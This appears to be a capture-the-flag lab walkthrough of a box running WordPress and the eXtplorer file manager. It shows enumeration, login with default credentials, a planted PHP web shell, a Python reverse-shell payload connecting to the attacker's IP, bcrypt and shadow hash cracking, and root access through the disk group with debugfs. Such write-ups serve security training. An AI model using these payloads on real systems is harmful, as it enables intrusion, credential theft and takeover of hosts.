## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.184.16

# HOSTNAME
dora                                               //Found post inital foothold
# OPERATING SYSTEM
Ubuntu 20.04.6 LTS (Focal Fossa)                   //Found post inital foothold
# CREDENTIALS  
dora:doraemon                                      //Found post inital foothold
```
## OPEN PORTS DETAILS
```bash
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
- Web Server 
	- Apache httpd 2.4.41
	- Wordpress
```
# ENUMERATION
```bash
sudo nano /etc/hosts
192.168.184.16  extplorer.pg

# Port 80
sudo curl -I $url
HTTP/1.1 302 Found
Server: Apache/2.4.41 (Ubuntu)
Location: http://192.168.184.16/wp-admin/setup-config.php
Content-Type: text/html; charset=UTF-8

sudo whatweb $url
http://192.168.184.16 [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.184.16], RedirectLocation[http://192.168.184.16/wp-admin/setup-config.php]

http://192.168.184.16/wp-admin/setup-config.php [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.184.16], JQuery[3.6.3], Script[text/javascript], Title[WordPress &rsaquo; Setup Configuration File]

- Seems like wordpress from url /wp-admin/setup-config.php


- Fuzzing Folders
sudo ffuf -c  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -of md -o fuzz/ffuf-raft-large-directories -fc 403,404 -u $url/FUZZ/
wp-content              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 42ms]
wp-admin                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 44ms]
wp-includes             [Status: 200, Size: 55250, Words: 3163, Lines: 265, Duration: 52ms]
wordpress               [Status: 200, Size: 749, Words: 52, Lines: 16, Duration: 39ms]
filemanager             [Status: 200, Size: 5697, Words: 354, Lines: 147, Duration: 67ms]

- Fuzzing Files
sudo ffuf -c  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -of md -o fuzz/ffuf-raft-large-files -fc 403,404 -u $url/FUZZ
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 45ms]         
wp-login.php            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 45ms]    
xmlrpc.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 43ms]       
readme.html             [Status: 200, Size: 7402, Words: 750, Lines: 98, Duration: 43ms]
license.txt             [Status: 200, Size: 19915, Words: 3331, Lines: 385, Duration: 40ms]
wp-trackback.php        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 41ms]
wp-settings.php         [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 39ms]           
wp-mail.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 42ms]
wp-cron.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 41ms]
wp-blog-header.php      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
wp-links-opml.php       [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 41ms]
wp-load.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
wp-signup.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
wp-activate.php         [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 40ms]

# Found extplorer login page - http://extplorer.pg/filemanager/
- Uses default credentials "admin:admin"
```
## INITIAL FOOTHOLD
```bash
# Found extplorer login page - http://extplorer.pg/filemanager/
- Uses default credentials "admin:admin"
- Create file under / directory with file named backdoor.php and php file contents "<?php system($_GET['cmd']);?>" 
- Save the file

# Web Shell
curl http://extplorer.pg/backdoor.php?cmd=id

# Proper shell
sudo nc -nvlp 80
- From browser Access
http://extplorer.pg/backdoor.php?cmd=python3%20-c%20%22import%20os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%27192.168.45.212%27,80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(%27HISTFILE%27,%27/dev/null%27);pty.spawn([%27/bin/bash%27,%27-i%27]);s.close();exit();%22


connect to [192.168.45.212] from (UNKNOWN) [192.168.184.16] 34374
www-data@dora:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@dora:/var/www/html$ whoami
www-data
```
## PRIVILEGE ESCALATION
```bash
# Found users from /etc/passwd
dora:x:1000:1000::/home/dora:/bin/sh

# Found user hash
www-data@dora:/tmp$ cat /var/www/html/filemanager/config/.htusers.php
<?php 
        // ensure this file is being included by a parent file
        if( !defined( '_JEXEC' ) && !defined( '_VALID_MOS' ) ) die( 'Restricted access' );
        $GLOBALS["users"]=array(
        array('admin','21232f297a57a5a743894a0e4a801fc3','/var/www/html','http://localhost','1','','7',1),
        array('dora','$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS','/var/www/html','http://localhost','1','','0',1),
); 

# Cracking the hash using john
sudo john --wordlist=/usr/share/wordlists/rockyou.txt userhash 
[sudo] password for kali: 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 256 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
doraemon         (?)     
1g 0:00:00:00 DONE (2024-11-18 11:27) 1.030g/s 1558p/s 1558c/s 1558C/s rachelle..something
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

# Credentials
dora:doraemon

# Disk group privilege escaltion 
# Reference - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group
id
uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)

- / is mounted on /dev/mapper/ubuntu--vg-ubuntu--lv
dora@dora:/tmp$ df -h       
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.1G  4.2G  55% /

dora@dora:/tmp$ debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs:  cat /etc/shadow
root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::

- Cracking the root hash with john
sudo john --wordlist=/usr/share/wordlists/rockyou.txt roothash 
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
explorer         (root)     
1g 0:00:00:00 DONE (2024-11-18 11:42) 1.694g/s 6074p/s 6074c/s 6074C/s adriano..fresa
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

# Creds
root:explorer

su root

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmPOfERLKCxx+ufQz7eRTNuEEkJ+GX/hKPNPpCWlTiTgegmjYoXQ7MA5ibTRoJ6vxpPEggzNszJKbBrSVAbRuT2sBg4o7ywiGUy7vsDBpObMrBMsdKuue3gpkaNF8DL2pB3v/XAxtavq1Mh4vz4yj99cc2pX1GhSjpQTWlsK8Rl9DmBKp7t0XxEWwq3juQ9JiN5yAttMrbTDjwMNxcipsYv0pMudDBE6g4gQyiZGwuUfBn+HirxnfRr7KkxmBaEpZgukXSJ7fXYgpQVgNP2cvd2sy/PYe0kL7lOfYwG/DSLWV917RPIdsPPQYr+rqrBL7XQA2Qll30Ms9iAX1m9S6pT/vkaw6JQCgDwFSwPXrknf627jCS7vQ8mh8UL07nPO7Hkko3fnHIcxyJggi/BoAAi3GseOl7vCZl28+waWlNdbR8gaiZhDR1rLvimcm3pg3nv9m+0qfVRIs9fxq97cOEFeXhaGHXvQL6LYGK14ZG+jVXtPavID6txymiBOUsj8M=
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAweAzke7+zPt3Untb06RlI4MEp+vsEJICUG+0GgPMp+vxOdxEhcsVY0VGyuC+plTRlqNi0zNv1Y0Jj0BYRMSUw=
|   256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPJP5z2Scxa02tfhI1SClflg5QtVdhMImHwY7GugVtfY
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

